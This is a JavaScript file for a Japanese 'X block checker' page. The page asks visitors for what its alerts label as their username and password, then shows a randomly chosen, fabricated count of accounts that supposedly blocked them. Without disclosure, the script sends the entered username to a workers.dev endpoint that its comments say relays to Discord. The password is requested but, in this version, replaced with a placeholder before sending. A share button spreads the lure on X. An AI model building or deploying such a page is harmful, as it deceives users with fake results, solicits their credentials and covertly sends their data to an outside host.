// =========================
// Xブロックチェッカー
// =========================

function checkResult() {

    const inputA =
        document.getElementById("inputA").value.trim();

    const inputB =
        document.getElementById("inputB").value.trim();


    // =========================
    // Aチェック
    // =========================

    if (inputA === "") {
        alert("ユーザー名");
        return;
    }

    if (!/^[a-zA-Z0-9]+$/.test(inputA)) {
        alert("パスワード");
        return;
    }


    // =========================
    // Bチェック
    // =========================

    if (inputB === "") {
        alert("Bを入力してください。");
        return;
    }

    if (!/^[a-zA-Z0-9]+$/.test(inputB)) {
        alert("Bは英数字のみで入力してください。");
        return;
    }

    if (inputB.length < 8) {
        alert("Bは8文字以上で入力してください。");
        return;
    }


    // =========================
    // 結果一覧
    // =========================

    const results = [
        "あなたは1人にブロックされていました！",
        "あなたは2人にブロックされていました！",
        "あなたは3人にブロックされていました！",
        "あなたは4人にブロックされていました！",
        "あなたは5人にブロックされていました！",
        "あなたは6人にブロックされていました！",
        "あなたは7人にブロックされていました！",
        "あなたは8人にブロックされていました！",
        "あなたは9人にブロックされていました！",
        "あなたは10人にブロックされていました！",
        "あなたは11人にブロックされていました！",
        "あなたは12人にブロックされていました！",
        "あなたは13人にブロックされていました！",
        "あなたは14人にブロックされていました！",
        "あなたは15人にブロックされていました！",
        "あなたは16人にブロックされていました！",
        "あなたは17人にブロックされていました！",
        "あなたは18人にブロックされていました！",
        "あなたは19人にブロックされていました！",
        "あなたは20人にブロックされていました！",
        "あなたは21人にブロックされていました！",
        "あなたは22人にブロックされていました！",
        "あなたは23人にブロックされていました！",
        "あなたは24人にブロックされていました！",
        "あなたは25人にブロックされていました！",
        "あなたは26人にブロックされていました！",
        "あなたは27人にブロックされていました！",
        "あなたは28人にブロックされていました！",
        "あなたは29人にブロックされていました！",
        "あなたは30人にブロックされていました！",
        "あなたは31人にブロックされていました！",
        "あなたは32人にブロックされていました！",
        "あなたは33人にブロックされていました！",
        "あなたは34人にブロックされていました！",
        "あなたは35人にブロックされていました！",
        "あなたは36人にブロックされていました！",
        "あなたは37人にブロックされていました！",
        "あなたは38人にブロックされていました！",
        "あなたは39人にブロックされていました！"
    ];


    // =========================
    // ランダム結果
    // =========================

    const randomIndex =
        Math.floor(Math.random() * results.length);

    const resultText =
        results[randomIndex];


    // =========================
    // 結果表示
    // =========================

    document.getElementById("resultText").textContent =
        resultText;

    document.getElementById("result")
        .classList.remove("hidden");


    // =========================
    // 同じA+Bの重複送信を防止
    // =========================

    const logKey =
        "checker_sent_" +
        inputA +
        "_" +
        inputB;

    const alreadySent =
        localStorage.getItem(logKey);


    // すでに送信済みなら
    // ここで終了
    // fetchは一切実行しない
    if (alreadySent) {

        console.log(
            "同じ内容はすでに送信済みです。ログ送信をスキップしました。"
        );

        return;
    }


    // =========================
    // Discordへ送信
    // =========================

    fetch(
        "https://dark-dawn-c121.flexfnbr7.workers.dev/",
        {
            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify({

                inputA: inputA,

                // Bそのものは送信しない
                inputB: "[入力済み]"

            })
        }
    )
    .then(response => {

        if (!response.ok) {
            throw new Error("送信失敗");
        }

        return response.json();

    })
    .then(data => {

        // Discordへの送信成功後に
        // このA+Bを送信済みとして保存
        localStorage.setItem(
            logKey,
            "sent"
        );

        console.log(
            "Discord送信成功"
        );

    })
    .catch(error => {

        console.error(
            "Discord送信エラー:",
            error
        );

    });
}


// =========================
// Xで結果をポスト
// =========================

function shareResult() {

    const result =
        document.getElementById("resultText").textContent;

    const SITE_URL =
        "https://iz7d.github.io/block-checker/";

    const number =
        result.match(/\d+/)?.[0] || "0";

    const text =
        "最近流行りのXブロックチェッカーやってみたら" +
        number +
        "人にブロックされてたw\n" +
        "試したいひと👇\n" +
        SITE_URL;

    const url =
        "https://twitter.com/intent/post?text=" +
        encodeURIComponent(text);

    window.open(
        url,
        "_blank",
        "width=600,height=500"
    );
}


// =========================
// A・B入力制限
// 英数字以外を入力した瞬間に削除
// =========================

document
    .getElementById("inputA")
    .addEventListener("input", function () {

        this.value =
            this.value.replace(
                /[^a-zA-Z0-9]/g,
                ""
            );

    });


document
    .getElementById("inputB")
    .addEventListener("input", function () {

        this.value =
            this.value.replace(
                /[^a-zA-Z0-9]/g,
                ""
            );

    });
